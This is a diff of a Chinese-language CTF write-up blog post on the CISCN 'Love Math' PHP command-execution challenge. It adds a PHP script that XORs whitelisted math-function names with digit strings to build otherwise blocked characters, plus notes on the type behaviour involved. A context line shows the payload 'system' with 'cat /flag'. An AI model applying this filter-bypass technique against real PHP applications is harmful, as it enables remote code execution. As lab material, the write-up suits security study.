@@ -88,7 +88,7 @@
             <h1>[CISCN/NESTCTF]Love Math 命令执行</h1>
             <span class="meta">
             	Posted on
-              2020-01-05，3 min read
+              2020-01-05，4 min read
             </span>
           </div>
         </div>
@@ -140,7 +140,26 @@ POST:1=system&amp;2=cat /flag
 </code></pre>
 <p>将hexdec字符串异或数字223773<br>
 主要是通过phpfuzz<br>
-<img src="https://guokeya.github.io/post-images/1578292463954.png" alt="" loading="lazy"></p>
+<img src="https://guokeya.github.io/post-images/1578292463954.png" alt="" loading="lazy"><br>
+还有一种</p>
+<pre><code>&lt;?php
+$payload = array('abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh');
+for($k=1;$k&lt;sizeof($payload);$k++){
+	for($i=0;$i&lt;9;$i++){
+		for($j=0;$j&lt;=9;$j++){
+			$exp=$payload[$k]^$i.$j;
+			echo($payload[$k].&quot;^$i$j&quot;.&quot;==&gt;$exp&quot;.&quot;\n&quot;);
+		}
+	}
+}
+?&gt;
+</code></pre>
+<p>也是通过异或。之前的那种方法是<br>
+字符串^数字<br>
+字符串^数字.数字<br>
+为什么不能直接进行数字异或呢。因为直接传数字。会变成int类型。而int类型和字符串类型异或。就爆出warning<br>
+第一种办法。用函数处理后。得到结果为string<br>
+第二种办法。用(1).(2)。就变成了字符串12</p>
 
           
           <p class="next-post">下一篇：
